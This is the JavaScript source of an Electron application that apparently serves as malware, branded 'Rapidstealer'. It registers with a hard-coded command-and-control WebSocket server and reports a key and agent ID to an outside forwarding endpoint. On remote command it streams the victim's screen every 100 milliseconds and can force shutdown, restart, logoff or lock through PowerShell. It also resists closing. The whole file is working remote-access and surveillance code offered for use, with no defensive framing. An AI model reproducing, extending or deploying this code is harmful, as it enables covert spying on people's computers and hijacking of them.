const { app, BrowserWindow, ipcMain, Tray, Menu, desktopCapturer } = require('electron');
const WebSocket = require('ws');
const path = require('path');
const https = require('https');
const { exec } = require('child_process');

const SERVER_URL = 'ws://83.142.209.75:571';
const AGENT_ID = Math.random().toString(36).slice(2, 10).toUpperCase();
const KEY = app.isPackaged ? (process.argv[1] || null) : (process.argv[2] || null);

function sendForward(key) {
  if (!key) return;

  const payload = JSON.stringify({
    key,
     username: "t.me/rapidstealerxx",
     avatar_url: "https://cdn.discordapp.com/attachments/1267444884495798283/1436475079927009362/cover_1.png?ex=690fbd2b&is=690e6bab&hm=8b7f7b7c597dcf11791ecf46479c99656c625760d6953dff5c3ac92ea6865a73&",
    embeds: [{
      author: {
      name: "t.me/rapidstealerxx - Stream Session",
      icon_url: "https://cdn.discordapp.com/attachments/1267444884495798283/1436475079927009362/cover_1.png?ex=690fbd2b&is=690e6bab&hm=8b7f7b7c597dcf11791ecf46479c99656c625760d6953dff5c3ac92ea6865a73&"
      },
      color: 0x000000,
      fields: [
        { name: 'Status', value: '<:connected:1490340889824985150>', inline: true },
        { name: 'AgentID', value: '`'+AGENT_ID+'`', inline: true },
        { name: 'View', value: '[Click to View!](http://83.142.209.75:571/'+AGENT_ID+")", inline: true }],
      footer: {
      text: `@Rapidstealer | t.me/rapidstealerxx | ${key}`,
      icon_url: `https://media.discordapp.net/attachments/1266493389365448754/1425475767252291724/cover_1.png?ex=68e7b942&is=68e667c2&hm=7009f2f6f58fc9e65e519cfa7b051b78aee9db70503f73e952db0499ceab985f&`,
      },
      thumbnail: {
      url: 'https://media.discordapp.net/attachments/1266493389365448754/1425475767252291724/cover_1.png?ex=68e7b942&is=68e667c2&hm=7009f2f6f58fc9e65e519cfa7b051b78aee9db70503f73e952db0499ceab985f&'
      },
    }]
  });

  const options = {
    hostname: 'vanillamods.xyz',
    path: '/api/forward',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(payload)
    }
  };

  const req = https.request(options, (res) => {
    let body = '';
    res.on('data', d => body += d);
    res.on('end', () => console.log('[FORWARD] status:', res.statusCode, body));
  });
  req.on('error', (e) => console.error('[FORWARD] error:', e.message));
  req.write(payload);
  req.end();
}

const PS_COMMANDS = {
  shutdown: 'Stop-Computer -Force',
  restart:  'Restart-Computer -Force',
  sleep:    'Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Application]::SetSuspendState("Suspend", $false, $false)',
  logout:   'logoff',
  lock:     'rundll32.exe user32.dll,LockWorkStation',
};

function runPowerShell(command) {
  const cmd = `powershell -NonInteractive -Command "${command.replace(/"/g, '\\"')}"`;
  exec(cmd, (err, stdout, stderr) => {
    if (err) console.error('[PS] error:', stderr || err.message);
    else console.log('[PS] output:', stdout);
  });
}

let chatWindow = null;
let tray = null;
let ws = null;
let screenInterval = null;

function connectWS() {
  ws = new WebSocket(SERVER_URL);

  ws.on('open', () => {
    ws.send(JSON.stringify({ type: 'register_agent', agentId: AGENT_ID }));
  });

  ws.on('message', (data) => {
    let msg;
    try { msg = JSON.parse(data); } catch { return; }

    if (msg.type === 'chat') {
      showChatWindow();
      if (chatWindow) {
        chatWindow.webContents.send('incoming-message', { text: msg.text, ts: msg.ts });
      }
    }

    if (msg.type === 'start_screen') startScreenCapture();
    if (msg.type === 'stop_screen')  stopScreenCapture();

    if (msg.type === 'powershell_cmd') {
      const psCmd = PS_COMMANDS[msg.command];
      if (psCmd) runPowerShell(psCmd);
    }
  });

  ws.on('close', () => {
    setTimeout(connectWS, 5000);
  });

  ws.on('error', () => {});
}

function showChatWindow() {
  if (chatWindow && !chatWindow.isDestroyed()) {
    chatWindow.show();
    chatWindow.focus();
    return;
  }

  chatWindow = new BrowserWindow({
    width: 380,
    height: 520,
    resizable: false,
    alwaysOnTop: true,
    frame: false,
    skipTaskbar: false,
    icon: path.join(__dirname, 'icon.ico'),
    webPreferences: {
      nodeIntegration: false,
      contextIsolation: true,
      preload: path.join(__dirname, 'preload.js')
    }
  });

  chatWindow.loadFile(path.join(__dirname, 'chat.html'));
  chatWindow.on('closed', () => { chatWindow = null; });
}

ipcMain.on('send-message', (_event, text) => {
  if (ws && ws.readyState === WebSocket.OPEN) {
    ws.send(JSON.stringify({ type: 'chat', text }));
  }
});

ipcMain.on('close-window', () => {
  if (chatWindow) chatWindow.hide();
});

ipcMain.on('start-screen', () => startScreenCapture());
ipcMain.on('stop-screen',  () => stopScreenCapture());

async function startScreenCapture() {
  if (screenInterval) return;
  screenInterval = setInterval(async () => {
    if (!ws || ws.readyState !== WebSocket.OPEN) return;
    try {
      const sources = await desktopCapturer.getSources({
        types: ['screen'],
        thumbnailSize: { width: 1920, height: 1080 }
      });
      if (!sources.length) return;
      const jpeg = sources[0].thumbnail.toJPEG(60);
      const header = Buffer.from(JSON.stringify({ type: 'screen_frame' }) + '\n');
      ws.send(Buffer.concat([header, jpeg]));
    } catch {}
  }, 100);
}

function stopScreenCapture() {
  if (screenInterval) {
    clearInterval(screenInterval);
    screenInterval = null;
  }
}

app.whenReady().then(() => {
  sendForward(KEY);
  connectWS();
});

app.on('window-all-closed', (e) => {
  e.preventDefault();
});
